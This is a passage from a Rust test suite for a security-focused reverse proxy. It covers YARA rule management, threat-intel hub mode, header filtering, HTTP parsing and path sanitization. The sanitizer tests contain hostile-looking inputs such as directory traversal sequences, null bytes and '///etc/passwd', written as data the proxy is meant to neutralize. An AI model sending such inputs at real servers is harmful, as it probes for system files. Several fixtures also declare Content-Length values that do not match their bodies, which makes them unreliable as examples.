    use synvoid::mesh::threat_intel::ThreatIntelligenceConfig;

    #[test]
    fn test_hub_only_mode_default_disabled() {
        let config = ThreatIntelligenceConfig::default();
        assert!(!config.hub_only_mode);
    }

    #[test]
    fn test_hub_only_mode_explicit_enable() {
        let config = ThreatIntelligenceConfig {
            hub_only_mode: true,
            behavioral_enabled: false,
            min_samples_for_fingerprint: 10,
            fingerprint_ttl_secs: 3600,
            high_severity_threshold: 70,
            ..Default::default()
        };
        assert!(config.hub_only_mode);
    }

    #[test]
    fn test_global_node_role_passes_hub_only() {
        let role = MeshNodeRole::GLOBAL;
        assert!(role.is_global());
    }

    #[test]
    fn test_non_global_node_role_fails_hub_only() {
        let edge_role = MeshNodeRole::EDGE;
        assert!(!edge_role.is_global());

        let origin_role = MeshNodeRole::ORIGIN;
        assert!(!origin_role.is_global());
    }

    #[test]
    fn test_global_edge_combined_passes_hub_only() {
        let combined = MeshNodeRole::GLOBAL | MeshNodeRole::EDGE;
        assert!(combined.is_global());
    }

    #[test]
    fn test_hub_only_mode_check_pattern() {
        let config = ThreatIntelligenceConfig {
            hub_only_mode: true,
            behavioral_enabled: false,
            min_samples_for_fingerprint: 10,
            fingerprint_ttl_secs: 3600,
            high_severity_threshold: 70,
            ..Default::default()
        };

        let global_role = MeshNodeRole::GLOBAL;
        let should_push = !config.hub_only_mode || global_role.is_global();
        assert!(should_push);

        let edge_role = MeshNodeRole::EDGE;
        let should_push_edge = !config.hub_only_mode || edge_role.is_global();
        assert!(!should_push_edge);
    }
}

#[cfg(test)]
mod yara_manager_lifecycle_tests {
    use synvoid::mesh::config::MeshNodeRole;
    use synvoid::mesh::yara_rules::{
        YaraRuleSubmissionStatus, YaraRulesManager, YaraRulesManagerConfig,
    };

    fn create_test_manager(role: MeshNodeRole) -> YaraRulesManager {
        let config = YaraRulesManagerConfig {
            enabled: true,
            rules_dir: None,
            mesh_broadcast_enabled: true,
        };
        YaraRulesManager::new(config, "test-node".to_string(), role, None, None, None)
    }

    #[test]
    fn test_yara_manager_creation() {
        let manager = create_test_manager(MeshNodeRole::EDGE);
        assert!(!manager.has_feed_manager());
    }

    #[test]
    fn test_yara_manager_stats_default() {
        let manager = create_test_manager(MeshNodeRole::GLOBAL);
        let stats = manager.get_stats();
        assert_eq!(stats.total_submissions, 0);
        assert_eq!(stats.pending_submissions, 0);
    }

    #[test]
    fn test_yara_manager_local_rules_empty_initially() {
        let manager = create_test_manager(MeshNodeRole::GLOBAL);
        let rules = manager.get_current_rules();
        assert!(rules.is_none() || rules.as_ref().is_none_or(|r| r.is_empty()));
    }

    #[test]
    fn test_yara_manager_get_pending_submissions_empty() {
        let manager = create_test_manager(MeshNodeRole::GLOBAL);
        let pending = manager.get_pending_submissions();
        assert!(pending.is_empty());
    }

    #[test]
    fn test_yara_manager_get_all_submissions_empty() {
        let manager = create_test_manager(MeshNodeRole::GLOBAL);
        let all = manager.get_all_submissions();
        assert!(all.is_empty());
    }

    #[test]
    fn test_yara_submission_status_variants() {
        let pending = YaraRuleSubmissionStatus::Pending;
        let approved = YaraRuleSubmissionStatus::Approved;
        let rejected = YaraRuleSubmissionStatus::Rejected;

        assert!(matches!(pending, YaraRuleSubmissionStatus::Pending));
        assert!(matches!(approved, YaraRuleSubmissionStatus::Approved));
        assert!(matches!(rejected, YaraRuleSubmissionStatus::Rejected));
    }

    #[test]
    fn test_yara_manager_config_defaults() {
        let config = YaraRulesManagerConfig::default();
        assert!(config.enabled);
        assert!(config.mesh_broadcast_enabled);
    }

    #[test]
    fn test_yara_manager_rejects_submission_non_global() {
        let manager = create_test_manager(MeshNodeRole::EDGE);

        let result = manager.reject_submission("nonexistent-id", "test rejection".to_string());

        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.to_string().contains("global") || err.to_string().contains("Global"));
    }

    #[test]
    fn test_yara_manager_rejects_nonexistent_submission() {
        let manager = create_test_manager(MeshNodeRole::GLOBAL);

        let result = manager.reject_submission("nonexistent-id", "test rejection".to_string());

        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.to_string().contains("not found") || err.to_string().contains("NotFound"));
    }

    #[test]
    fn test_yara_manager_accepts_approved_rules_broadcast() {
        let manager = create_test_manager(MeshNodeRole::GLOBAL);

        let result = manager.broadcast_approved_rules("v1.0.0");
        assert!(result.is_ok());
    }

    #[test]
    fn test_yara_manager_get_stats() {
        let manager = create_test_manager(MeshNodeRole::GLOBAL);
        let stats = manager.get_stats();

        assert!(stats.current_version.is_none());
        assert_eq!(stats.total_submissions, 0);
        assert_eq!(stats.pending_submissions, 0);
        assert!(stats.is_global);
    }
}

#[cfg(test)]
mod proxy_pipeline_tests {
    use ahash::AHashSet;
    use bytes::Bytes;
    use http_body_util::Full;
    use std::net::SocketAddr;
    use synvoid::http_client::{get, post_json};
    use synvoid::proxy::{
        filter_response_headers, filter_response_headers_buf, is_hop_by_hop_header,
        sanitize_request_path,
    };
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpListener;
    use tokio::time::Duration;

    #[test]
    fn test_sanitize_request_path_url_encoding_basic() {
        assert_eq!(
            sanitize_request_path("/path%20with%20spaces"),
            "/path with spaces"
        );
        assert_eq!(sanitize_request_path("/hello%2Fworld"), "/hello/world");
    }

    #[test]
    fn test_sanitize_request_path_url_encoding_valid() {
        assert_eq!(
            sanitize_request_path("/path%20with%20spaces"),
            "/path with spaces"
        );
        assert_eq!(sanitize_request_path("/hello%2Fworld"), "/hello/world");
        assert_eq!(sanitize_request_path("/%ZZ"), "/%ZZ");
    }

    #[test]
    fn test_sanitize_request_path_null_bytes() {
        assert_eq!(sanitize_request_path("/api\x00users"), "/apiusers");
        assert_eq!(sanitize_request_path("/\x00/path"), "/path");
        assert_eq!(sanitize_request_path("/%00null"), "/null");
    }

    #[test]
    fn test_sanitize_request_path_control_chars() {
        assert_eq!(sanitize_request_path("/api\x01\x02users"), "/apiusers");
        assert_eq!(sanitize_request_path("/path\x1F/more"), "/path/more");
        assert_eq!(sanitize_request_path("/path~more"), "/path~more");
    }

    #[test]
    fn test_sanitize_request_path_directory_traversal() {
        assert_eq!(sanitize_request_path("/a/b/../c"), "/a/c");
        assert_eq!(sanitize_request_path("/../a"), "/a");
    }

    #[test]
    fn test_sanitize_request_path_multiple_slashes() {
        assert_eq!(sanitize_request_path("///etc/passwd"), "/etc/passwd");
        assert_eq!(sanitize_request_path("/api//users"), "/api/users");
        assert_eq!(sanitize_request_path("/a///b"), "/a/b");
    }

    #[test]
    fn test_sanitize_request_path_unicode_normalization() {
        let result = sanitize_request_path("/caf\u{00E9}");
        assert_eq!(result, "/caf\u{00E9}");

        let composed = sanitize_request_path("/caf\u{0065}\u{0301}");
        assert_eq!(composed, "/caf\u{00E9}");
    }

    #[test]
    fn test_sanitize_request_path_dot_segments_preserved() {
        assert_eq!(sanitize_request_path("/a/./b"), "/a/b");
    }

    #[test]
    fn test_sanitize_request_path_empty_after_sanitization() {
        assert_eq!(sanitize_request_path("/.."), "/");
    }

    #[test]
    fn test_sanitize_request_path_returns_cow() {
        use std::borrow::Cow;
        let result = sanitize_request_path("/api/users");
        assert!(matches!(result, Cow::Owned(_)));

        let simple = sanitize_request_path("/simple");
        assert!(matches!(simple, Cow::Owned(_)));
    }

    #[test]
    fn test_is_hop_by_hop_header_case_insensitive() {
        assert!(is_hop_by_hop_header("Connection"));
        assert!(is_hop_by_hop_header("CONNECTION"));
        assert!(is_hop_by_hop_header("connection"));
        assert!(is_hop_by_hop_header("KEEP-ALIVE"));
        assert!(is_hop_by_hop_header("Keep-Alive"));
        assert!(is_hop_by_hop_header("Transfer-Encoding"));
        assert!(is_hop_by_hop_header("UPGRADE"));
    }

    #[test]
    fn test_is_hop_by_hop_header_not_hop() {
        assert!(!is_hop_by_hop_header("Content-Type"));
        assert!(!is_hop_by_hop_header("Content-Length"));
        assert!(!is_hop_by_hop_header("Host"));
        assert!(!is_hop_by_hop_header("Authorization"));
        assert!(!is_hop_by_hop_header("X-Forwarded-For"));
        assert!(!is_hop_by_hop_header("X-Real-IP"));
        assert!(!is_hop_by_hop_header("User-Agent"));
    }

    #[test]
    fn test_filter_response_headers_preserves_normal() {
        let mut headers = http::HeaderMap::new();
        headers.insert("content-type", "application/json".parse().unwrap());
        headers.insert("date", "Mon, 01 Jan 2024 00:00:00 GMT".parse().unwrap());
        headers.insert("cache-control", "max-age=3600".parse().unwrap());

        let filtered = filter_response_headers(&headers, &AHashSet::new());
        let names: Vec<&str> = filtered.iter().map(|(k, _)| k.as_str()).collect();

        assert!(names.contains(&"content-type"));
        assert!(names.contains(&"date"));
        assert!(names.contains(&"cache-control"));
        assert_eq!(names.len(), 3);
    }

    #[test]
    fn test_filter_response_headers_strips_hop_by_hop() {
        let mut headers = http::HeaderMap::new();
        headers.insert("connection", "keep-alive".parse().unwrap());
        headers.insert("keep-alive", "timeout=5".parse().unwrap());
        headers.insert("transfer-encoding", "chunked".parse().unwrap());
        headers.insert("upgrade", "websocket".parse().unwrap());
        headers.insert("te", "trailers".parse().unwrap());
        headers.insert("trailers", "x-custom".parse().unwrap());
        headers.insert("content-type", "text/html".parse().unwrap());

        let filtered = filter_response_headers(&headers, &AHashSet::new());
        let names: Vec<&str> = filtered.iter().map(|(k, _)| k.as_str()).collect();

        assert!(names.contains(&"content-type"));
        assert!(!names.contains(&"connection"));
        assert!(!names.contains(&"keep-alive"));
        assert!(!names.contains(&"transfer-encoding"));
        assert!(!names.contains(&"upgrade"));
        assert!(!names.contains(&"te"));
        assert!(!names.contains(&"trailers"));
    }

    #[test]
    fn test_filter_response_headers_strips_server_leaks() {
        let mut headers = http::HeaderMap::new();
        headers.insert("server", "nginx/1.18".parse().unwrap());
        headers.insert("x-powered-by", "PHP/7.4".parse().unwrap());
        headers.insert("x-aspnet-version", "5.0".parse().unwrap());
        headers.insert("x-runtime", "0.5".parse().unwrap());
        headers.insert("content-type", "text/html".parse().unwrap());

        let mut custom_filter = AHashSet::new();
        custom_filter.insert("server".to_string());
        custom_filter.insert("x-powered-by".to_string());
        custom_filter.insert("x-runtime".to_string());

        let filtered = filter_response_headers(&headers, &custom_filter);
        let names: Vec<&str> = filtered.iter().map(|(k, _)| k.as_str()).collect();

        assert!(names.contains(&"content-type"));
        assert!(!names.contains(&"server"));
        assert!(!names.contains(&"x-powered-by"));
        assert!(names.contains(&"x-aspnet-version"));
        assert!(!names.contains(&"x-runtime"));
    }

    #[test]
    fn test_filter_response_headers_custom_filters() {
        let mut headers = http::HeaderMap::new();
        headers.insert("x-custom-secret", "value".parse().unwrap());
        headers.insert("x-internal", "debug".parse().unwrap());
        headers.insert("content-type", "application/json".parse().unwrap());

        let mut custom_filters = AHashSet::new();
        custom_filters.insert("x-custom-secret".to_string());
        custom_filters.insert("x-internal".to_string());

        let filtered = filter_response_headers(&headers, &custom_filters);
        let names: Vec<&str> = filtered.iter().map(|(k, _)| k.as_str()).collect();

        assert!(names.contains(&"content-type"));
        assert!(!names.contains(&"x-custom-secret"));
        assert!(!names.contains(&"x-internal"));
    }

    #[test]
    fn test_filter_response_headers_buf_returns_map() {
        use ahash::AHashSet;

        let mut headers1 = http::HeaderMap::new();
        headers1.insert("content-type", "text/html".parse().unwrap());
        headers1.insert("x-secret", "hidden".parse().unwrap());

        let mut filter_set = AHashSet::new();
        filter_set.insert("x-secret".parse::<http::header::HeaderName>().unwrap());

        let result = filter_response_headers_buf(&headers1, &filter_set);
        assert_eq!(result.len(), 1);
        assert!(result.get("content-type").is_some());

        let mut headers2 = http::HeaderMap::new();
        headers2.insert("x-another", "value".parse().unwrap());

        let result2 = filter_response_headers_buf(&headers2, &AHashSet::new());
        assert_eq!(result2.len(), 1);
        assert!(result2.get("x-another").is_some());
    }

    #[tokio::test]
    async fn test_forward_request_basic() {
        let addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
        let listener = TcpListener::bind(addr).await.unwrap();
        let bind_addr: SocketAddr = listener.local_addr().unwrap();

        let server = tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let mut buf = [0u8; 4096];
            let n = socket.read(&mut buf).await.unwrap();

            let request = String::from_utf8_lossy(&buf[..n]);
            assert!(request.starts_with("GET /test HTTP/1.1"));
            assert!(request.to_lowercase().contains("host:"));

            let response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 11\r\n\r\nHello World";
            socket.write_all(response.as_bytes()).await.unwrap();
            socket.shutdown().await.unwrap();
        });

        let client = tokio::spawn(async move {
            let url = format!("http://{}/test", bind_addr);
            let client = synvoid::http_client::create_http_client_with_config(
                Duration::from_secs(5),
                10,
                Duration::from_secs(30),
            );

            let res = get(&client, &url).await.unwrap();
            assert_eq!(res.status_code(), 200);

            let body = String::from_utf8_lossy(&res.body);
            assert_eq!(body, "Hello World");
        });

        server.await.unwrap();
        client.await.unwrap();
    }

    #[tokio::test]
    async fn test_forward_request_post_with_body() {
        let addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
        let listener = TcpListener::bind(addr).await.unwrap();
        let bind_addr: SocketAddr = listener.local_addr().unwrap();

        let server = tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let mut buf = [0u8; 4096];
            let n = socket.read(&mut buf).await.unwrap();

            let request = String::from_utf8_lossy(&buf[..n]);
            assert!(request.starts_with("POST /api/data HTTP/1.1"));
            assert!(request.to_lowercase().contains("content-length:"));
            assert!(request.contains("key"));

            let response = "HTTP/1.1 201 Created\r\nContent-Type: application/json\r\nContent-Length: 26\r\n\r\n{\"status\":\"created\",\"id\":123}";
            socket.write_all(response.as_bytes()).await.unwrap();
            socket.shutdown().await.unwrap();
        });

        let client = tokio::spawn(async move {
            let url = format!("http://{}/api/data", bind_addr);
            let http_client = synvoid::http_client::create_http_client_with_config(
                Duration::from_secs(5),
                10,
                Duration::from_secs(30),
            );

            #[derive(serde::Serialize)]
            struct PostData<'a> {
                key: &'a str,
            }

            let res = post_json(&http_client, &url, &PostData { key: "value" })
                .await
                .unwrap();
            assert_eq!(res.status_code(), 201);

            let body = String::from_utf8_lossy(&res.body);
            assert!(body.contains("created"));
        });

        server.await.unwrap();
        client.await.unwrap();
    }

    #[tokio::test]
    async fn test_forward_request_upstream_error() {
        let addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
        let listener = TcpListener::bind(addr).await.unwrap();
        let bind_addr: SocketAddr = listener.local_addr().unwrap();

        let server = tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let mut buf = [0u8; 4096];
            let _n = socket.read(&mut buf).await.unwrap();

            let response = "HTTP/1.1 500 Internal Server Error\r\nContent-Length: 0\r\n\r\n";
            socket.write_all(response.as_bytes()).await.unwrap();
        });

        let client = tokio::spawn(async move {
            let url = format!("http://{}/error", bind_addr);
            let client = synvoid::http_client::create_http_client_with_config(
                Duration::from_secs(5),
                10,
                Duration::from_secs(30),
            );

            let res = get(&client, &url).await.unwrap();
            assert_eq!(res.status_code(), 500);
        });

        server.await.unwrap();
        client.await.unwrap();
    }

    #[tokio::test]
    async fn test_forward_request_hop_by_hop_headers_stripped() {
        let addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
        let listener = TcpListener::bind(addr).await.unwrap();
        let bind_addr: SocketAddr = listener.local_addr().unwrap();

        let server = tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let mut buf = [0u8; 8192];
            let n = socket.read(&mut buf).await.unwrap();

            let request = String::from_utf8_lossy(&buf[..n]);
            assert!(request.starts_with("GET /test HTTP/1.1"));
            assert!(!request.contains("Connection:"));
            assert!(!request.contains("Keep-Alive:"));
            assert!(!request.contains("Transfer-Encoding:"));
            assert!(!request.contains("Upgrade:"));

            let response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 11\r\n\r\nHello World";
            socket.write_all(response.as_bytes()).await.unwrap();
        });

        let client = tokio::spawn(async move {
            let url = format!("http://{}/test", bind_addr);
            let http_client = synvoid::http_client::create_http_client_with_config(
                Duration::from_secs(5),
                10,
                Duration::from_secs(30),
            );

            let mut req = http::Request::new(Full::new(Bytes::new()));
            *req.uri_mut() = url.parse().unwrap();
            *req.method_mut() = http::Method::GET;
            req.headers_mut()
                .insert("Connection", "keep-alive".parse().unwrap());
            req.headers_mut()
                .insert("Keep-Alive", "timeout=5".parse().unwrap());
            req.headers_mut()
                .insert("Upgrade", "websocket".parse().unwrap());

            let res = http_client.request(req).await.unwrap();
            assert_eq!(res.status().as_u16(), 200);
        });

        server.await.unwrap();
        client.await.unwrap();
    }

    #[tokio::test]
    async fn test_forward_request_response_headers_received() {
        let addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
        let listener = TcpListener::bind(addr).await.unwrap();
        let bind_addr: SocketAddr = listener.local_addr().unwrap();

        let server = tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let mut buf = [0u8; 4096];
            let _n = socket.read(&mut buf).await.unwrap();

            let response = "HTTP/1.1 200 OK\r\n\
                Server: nginx/1.18\r\n\
                X-Powered-By: PHP/7.4\r\n\
                Content-Type: text/plain\r\n\
                Content-Length: 11\r\n\r\n\
                Hello World";
            socket.write_all(response.as_bytes()).await.unwrap();
            socket.shutdown().await.unwrap();
        });

        let client = tokio::spawn(async move {
            let url = format!("http://{}/test", bind_addr);
            let client = synvoid::http_client::create_http_client_with_config(
                Duration::from_secs(5),
                10,
                Duration::from_secs(30),
            );

            let res = get(&client, &url).await.unwrap();
            assert_eq!(res.status_code(), 200);

            let body = String::from_utf8_lossy(&res.body);
            assert_eq!(body, "Hello World");
        });

        server.await.unwrap();
        client.await.unwrap();
    }

    #[tokio::test]
    async fn test_forward_request_connection_timeout() {
        let addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
        let listener = TcpListener::bind(addr).await.unwrap();
        let _bind_addr: SocketAddr = listener.local_addr().unwrap();

        drop(listener);

        let client = tokio::spawn(async move {
            let url = "http://127.0.0.1:0/test";
            let client = synvoid::http_client::create_http_client_with_config(
                Duration::from_secs(1),
                10,
                Duration::from_secs(30),
            );

            let result = get(&client, url).await;
            assert!(result.is_err());
        });

        let _ = client.await;
    }

    #[tokio::test]
    async fn test_forward_request_invalid_url() {
        let client = tokio::spawn(async move {
            let url = "http://[invalid:::]/test";
            let client = synvoid::http_client::create_http_client_with_config(
                Duration::from_secs(5),
                10,
                Duration::from_secs(30),
            );

            let result = get(&client, url).await;
            assert!(result.is_err());
        });

        let _ = client.await;
    }
}

#[cfg(test)]
mod http_server_handler_tests {
    use synvoid::config::MainConfig;
    use synvoid::http::shared_handler::SharedRequestHandler;

    fn make_test_config() -> MainConfig {
        MainConfig::default()
    }

    #[test]
    fn test_shared_handler_health_request() {
        let handler = SharedRequestHandler::new();
        let config = make_test_config();

        let resp = handler.handle_health_request(&None, &config);

        assert_eq!(resp.status(), 200);
    }

    #[test]
    fn test_shared_handler_ready_request_healthy() {
        let handler = SharedRequestHandler::new();
        let config = make_test_config();

        let resp = handler.handle_ready_request(true, &None, &config);

        assert_eq!(resp.status(), 200);
    }

    #[test]
    fn test_shared_handler_ready_request_not_ready() {
        let handler = SharedRequestHandler::new();
        let config = make_test_config();

        let resp = handler.handle_ready_request(false, &None, &config);

        assert_eq!(resp.status(), 503);
    }

    #[test]
    fn test_shared_handler_build_json_response() {
        let handler = SharedRequestHandler::new();
        let config = make_test_config();

        let resp = handler.build_json_response(200, r#"{"test":true}"#.to_string(), &None, &config);

        assert_eq!(resp.status(), 200);
        assert!(resp.headers().get("content-type").is_some());
    }

    #[test]
    fn test_shared_handler_build_error_response_404() {
        let handler = SharedRequestHandler::new();
        let config = make_test_config();

        let resp = handler.build_error_response(404, "Not Found", &None, &config);

        assert_eq!(resp.status(), 404);
    }

    #[test]
    fn test_shared_handler_build_error_response_500() {
        let handler = SharedRequestHandler::new();
        let config = make_test_config();

        let resp = handler.build_error_response(500, "Internal Server Error", &None, &config);

        assert_eq!(resp.status(), 500);
    }

    #[test]
    fn test_shared_handler_build_response_with_cookie() {
        let handler = SharedRequestHandler::new();
        let config = make_test_config();

        let resp = handler.build_response_with_cookie(
            200,
            r#"{"logged_in":true}"#.to_string(),
            "application/json",
            "session=abc123",
            &None,
            &config,
        );

        assert_eq!(resp.status(), 200);
        assert!(resp.headers().get("set-cookie").is_some());
    }

    #[test]
    fn test_shared_handler_build_response_with_alt_svc() {
        let handler = SharedRequestHandler::new();
        let config = make_test_config();

        let alt_svc = Some("h2=\"https://alt.example.com:443\"".to_string());
        let resp = handler.build_response_with_alt_svc(
            200,
            r#"{"ok":true}"#.to_string(),
            "application/json",
            &alt_svc,
            &config,
        );

        assert_eq!(resp.status(), 200);
        assert!(resp.headers().get("alt-svc").is_some());
    }
}

#[cfg(test)]
mod early_http_parser_tests {
    use synvoid::http::early_parse::EarlyHttpParser;

    #[test]
    fn test_parse_get_root() {
        let data = b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_some());
        let req = result.unwrap();
        assert_eq!(req.method, "GET");
        assert_eq!(req.path, "/");
        assert_eq!(req.host, Some("localhost".to_string()));
        assert!(req.cookies.is_none());
        assert_eq!(req.content_length, None);
    }

    #[test]
    fn test_parse_get_with_query_params() {
        let data = b"GET /api/items?id=123&name=test HTTP/1.1\r\nHost: localhost\r\n\r\n";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_some());
        let req = result.unwrap();
        assert_eq!(req.method, "GET");
        assert_eq!(req.path, "/api/items?id=123&name=test");
    }

    #[test]
    fn test_parse_post_with_json_body() {
        let data = b"POST /api/data HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 13\r\n\r\n{\"key\":\"value\"}";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_some());
        let req = result.unwrap();
        assert_eq!(req.method, "POST");
        assert_eq!(req.path, "/api/data");
        assert_eq!(req.content_length, Some(13));
    }

    #[test]
    fn test_parse_with_multiple_cookies() {
        let data = b"GET / HTTP/1.1\r\nHost: localhost\r\nCookie: session=abc; csrf=xyz; theme=dark\r\n\r\n";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_some());
        let req = result.unwrap();
        assert!(req.cookies.is_some());
        let cookies = req.cookies.unwrap();
        assert!(cookies.contains("session=abc"));
        assert!(cookies.contains("csrf=xyz"));
        assert!(cookies.contains("theme=dark"));
    }

    #[test]
    fn test_parse_missing_host() {
        let data = b"GET / HTTP/1.1\r\n\r\n";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_some());
        let req = result.unwrap();
        assert_eq!(req.method, "GET");
        assert_eq!(req.path, "/");
        assert!(req.host.is_none());
    }

    #[test]
    fn test_parse_empty_request() {
        let data = b"";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_none());
    }

    #[test]
    fn test_parse_partial_request() {
        let data = b"GET /api";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_none());
    }

    #[test]
    fn test_parse_malformed_request_line() {
        let data = b"GET / HTTP/1.0\r\n\r\n";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_some());
        let req = result.unwrap();
        assert_eq!(req.method, "GET");
        assert_eq!(req.path, "/");
    }

    #[test]
    fn test_parse_delete_method() {
        let data = b"DELETE /api/items/123 HTTP/1.1\r\nHost: localhost\r\n\r\n";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_some());
        let req = result.unwrap();
        assert_eq!(req.method, "DELETE");
        assert_eq!(req.path, "/api/items/123");
    }

    #[test]
    fn test_parse_put_method() {
        let data = b"PUT /api/items/123 HTTP/1.1\r\nHost: localhost\r\nContent-Length: 10\r\n\r\n{\"id\":\"123\"}";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_some());
        let req = result.unwrap();
        assert_eq!(req.method, "PUT");
        assert_eq!(req.path, "/api/items/123");
        assert_eq!(req.content_length, Some(10));
    }

    #[test]
    fn test_parse_patch_method() {
        let data = b"PATCH /api/items/123 HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\n{\"name\":\"updated\"}";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_some());
        let req = result.unwrap();
        assert_eq!(req.method, "PATCH");
        assert_eq!(req.path, "/api/items/123");
        assert_eq!(req.content_length, Some(15));
    }

    #[test]
    fn test_parse_head_method() {
        let data = b"HEAD /api/items HTTP/1.1\r\nHost: localhost\r\n\r\n";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_some());
        let req = result.unwrap();
        assert_eq!(req.method, "HEAD");
        assert_eq!(req.path, "/api/items");
    }

    #[test]
    fn test_parse_options_method() {
        let data = b"OPTIONS * HTTP/1.1\r\nHost: localhost\r\n\r\n";
        let result = EarlyHttpParser::parse(data);

        assert!(result.is_some());
        let req = result.unwrap();
        assert_eq!(req.method, "OPTIONS");
        assert_eq!(req.path, "*");
    }
}

#[cfg(test)]
mod response_builder_tests {
    use synvoid::config::MainConfig;
    use synvoid::http::response_builder::{
        build_json_response, build_response_with_alt_svc, build_response_with_cookie,
        error_response_bytes, error_response_full, reason_phrase,
    };

    fn make_test_config() -> MainConfig {
        MainConfig::default()
    }

    #[test]
    fn test_reason_phrase_coverage() {
        assert_eq!(reason_phrase(100), "Continue");
        assert_eq!(reason_phrase(101), "Switching Protocols");
        assert_eq!(reason_phrase(201), "Created");
        assert_eq!(reason_phrase(204), "No Content");
        assert_eq!(reason_phrase(301), "Moved Permanently");
        assert_eq!(reason_phrase(302), "Found");
        assert_eq!(reason_phrase(304), "Not Modified");
    }

    #[test]
    fn test_error_response_bytes_body() {
        let resp = error_response_bytes(400);
        assert_eq!(resp.body(), &bytes::Bytes::from_static(b"Bad Request"));
    }

    #[test]
    fn test_error_response_full_status() {
        let resp = error_response_full(404);
        assert_eq!(resp.status(), 404);
    }

    #[test]
    fn test_build_json_response_content_type() {
        let config = make_test_config();
        let resp = build_json_response(200, r#"{"test":true}"#.to_string(), &None, &config);

        assert_eq!(resp.status(), 200);
        let ct = resp.headers().get("content-type").unwrap();
        assert!(ct.to_str().unwrap().contains("application/json"));
    }

    #[test]
    fn test_build_response_with_cookie_sets_header() {
        let config = make_test_config();
        let resp = build_response_with_cookie(
            200,
            r#"{"ok":true}"#.to_string(),
            "application/json",
            "session=xyz",
            &None,
            &config,
        );

        assert_eq!(resp.status(), 200);
        assert!(resp.headers().get("set-cookie").is_some());
    }

    #[test]
    fn test_build_response_with_alt_svc() {
        let config = make_test_config();
        let alt_svc = Some("h2=\"localhost:8443\"".to_string());
        let resp =
            build_response_with_alt_svc(200, "OK".to_string(), "text/plain", &alt_svc, &config);

        assert_eq!(resp.status(), 200);
        assert!(resp.headers().get("alt-svc").is_some());
    }
}

#[cfg(test)]
mod http_security_header_tests {
    use http::Response;
    use synvoid::config::site::{SiteCorsConfig, SiteSecurityHeadersConfig};
    use synvoid::http::headers::{
        compute_websocket_accept_key, inject_cors_headers, inject_security_headers,
        is_websocket_upgrade,
    };

    fn make_security_config() -> SiteSecurityHeadersConfig {
        SiteSecurityHeadersConfig {
            enabled: None,
            strict_transport_security: Some("max-age=31536000; includeSubDomains".to_string()),
            content_security_policy: Some("default-src 'self'".to_string()),
            x_frame_options: Some("DENY".to_string()),
            x_content_type_options: Some("nosniff".to_string()),
            x_xss_protection: Some("1; mode=block".to_string()),
            referrer_policy: Some("strict-origin-when-cross-origin".to_string()),
            permissions_policy: Some("geolocation=()".to_string()),
            cache_control: Some("no-store".to_string()),
            expect_ct: None,
            x_permitted_cross_domain_policies: Some("none".to_string()),
            x_download_options: Some("noopen".to_string()),
            content_type: None,
            more_clear_headers: vec![],
            cors: SiteCorsConfig::default(),
            cookie: Default::default(),
            date_header: None,
            date_jitter_seconds: None,
            server_token: None,
        }
    }

    #[test]
    fn test_inject_security_headers_all_present() {
        let config = make_security_config();
        let builder = Response::builder();
        let resp = inject_security_headers(builder, &config).body(()).unwrap();

        assert_eq!(
            resp.headers().get("strict-transport-security").unwrap(),
            "max-age=31536000; includeSubDomains"
        );
        assert_eq!(
            resp.headers().get("content-security-policy").unwrap(),
            "default-src 'self'"
        );
        assert_eq!(resp.headers().get("x-frame-options").unwrap(), "DENY");
        assert_eq!(
            resp.headers().get("x-content-type-options").unwrap(),
            "nosniff"
        );
        assert_eq!(
            resp.headers().get("x-xss-protection").unwrap(),
            "1; mode=block"
        );
        assert_eq!(
            resp.headers().get("referrer-policy").unwrap(),
            "strict-origin-when-cross-origin"
        );
        assert_eq!(
            resp.headers().get("permissions-policy").unwrap(),
            "geolocation=()"
        );
        assert_eq!(resp.headers().get("cache-control").unwrap(), "no-store");
        assert_eq!(
            resp.headers()
                .get("x-permitted-cross-domain-policies")
                .unwrap(),
            "none"
        );
        assert_eq!(resp.headers().get("x-download-options").unwrap(), "noopen");
    }

    #[test]
    fn test_is_websocket_upgrade_edge_cases() {
        let mut headers = http::HeaderMap::new();

        headers.insert("upgrade", "websocket".parse().unwrap());
        headers.insert("connection", "Upgrade".parse().unwrap());
        assert!(is_websocket_upgrade(&headers));

        headers.clear();
        headers.insert("upgrade", "websocket".parse().unwrap());
        headers.insert("connection", "upgrade".parse().unwrap());
        assert!(is_websocket_upgrade(&headers));

        headers.clear();
        headers.insert("upgrade", "websocket".parse().unwrap());
        headers.insert("connection", "keep-alive".parse().unwrap());
        assert!(!is_websocket_upgrade(&headers));

        headers.clear();
        headers.insert("upgrade", "h2".parse().unwrap());
        headers.insert("connection", "Upgrade".parse().unwrap());
        assert!(!is_websocket_upgrade(&headers));

        headers.clear();
        headers.insert("connection", "Upgrade".parse().unwrap());
        assert!(!is_websocket_upgrade(&headers));
    }

    #[test]
    fn test_compute_websocket_accept_key_rfc6455() {
